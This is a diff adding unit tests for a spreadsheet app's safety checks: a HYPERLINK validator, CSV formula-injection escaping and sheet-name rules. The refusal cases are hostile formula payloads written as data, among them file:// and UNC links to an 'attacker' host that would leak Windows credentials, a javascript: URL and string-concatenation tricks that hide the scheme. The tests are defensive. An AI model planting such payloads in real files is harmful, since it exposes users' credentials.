@@ -169,3 +169,45 @@ test('CSV: text that another program would run as a formula is quoted as text', 
   assert.ok(lines[0]!.includes("'@SUM(1)"), lines[0]);
   assert.equal(lines[1], 'Aarav Sharma,-5,', 'ordinary text and a negative number are untouched');
 });
+
+test('HYPERLINK: only http, https and mailto targets leave in a file', () => {
+  // Permit twins: ordinary links, including one completed from a cell.
+  for (const f of ['=HYPERLINK("https://tatvaos.com","site")', '=HYPERLINK("http://example.org")',
+    '=HYPERLINK("mailto:office@school.in","Write")', '=HYPERLINK("https://tatvaos.com/fees?id="&A2,"Fees")',
+    '=hyperlink( "HTTPS://TATVAOS.COM" )', '=IF(A1>0,HYPERLINK("https://a.in"),"")']) {
+    assert.equal(formulaIsSafe(f), true, `ordinary link refused: ${f}`);
+  }
+  // Refusals: anything that can make Windows authenticate to someone else's
+  // server (file:, UNC paths), script, and a target that cannot be read.
+  for (const f of ['=HYPERLINK("file://attacker/share/x","open")', String.raw`=HYPERLINK("\\attacker\share\x")`,
+    '=HYPERLINK("javascript:alert(1)")', '=HYPERLINK(A2,"from a cell")', '=HYPERLINK("ht"&"tp://x")',
+    '=HYPERLINK("http"&":"&"//x")', '=HYPERLINK()', '=HYPERLINK("https://ok.in") & HYPERLINK("file:///c:/x")']) {
+    assert.equal(formulaIsSafe(f), false, `dangerous link allowed: ${f}`);
+  }
+});
+
+test('CSV: a leading tab or carriage return is neutralised too; ordinary text is not', () => {
+  const s = emptySheet('Sheet1');
+  s.cells.set(cellKey(0, 0), { input: "'\t=1+1", value: '\t=1+1' });
+  s.cells.set(cellKey(0, 1), { input: "'\r=1+1", value: '\r=1+1' });
+  s.cells.set(cellKey(1, 0), { input: 'plain', value: 'plain' });       // permit twin
+  const out = writeCsv(s);
+  assert.ok(out.startsWith(`'\t=1+1,`), JSON.stringify(out.slice(0, 20)));
+  assert.ok(out.includes(`"'\r=1+1"`), JSON.stringify(out.slice(0, 30)));
+  assert.ok(/\r?\nplain,/.test(out), JSON.stringify(out));
+});
+
+test('a sheet name the file format cannot carry is refused with a reason, not silently changed', () => {
+  const m = new SheetsModel(new Y.Doc());
+  m.ensureSeeded();
+  const id = m.sheetIds()[0]!;
+  // Permit twin: an ordinary name goes through.
+  assert.equal(m.renameSheet(id, 'Fees 2026-27'), null);
+  assert.equal(m.meta(id)!.name, 'Fees 2026-27');
+  for (const bad of ['Q1 [draft]', 'a:b', 'what?', 'x*y', 'a/b', String.raw`a\b`]) {
+    const msg = m.renameSheet(id, bad);
+    assert.ok(typeof msg === 'string' && msg.includes('cannot contain'), `no reason given for "${bad}": ${msg}`);
+    assert.equal(m.meta(id)!.name, 'Fees 2026-27', `name changed despite refusal: "${bad}"`);
+  }
+  m.destroy();
+});
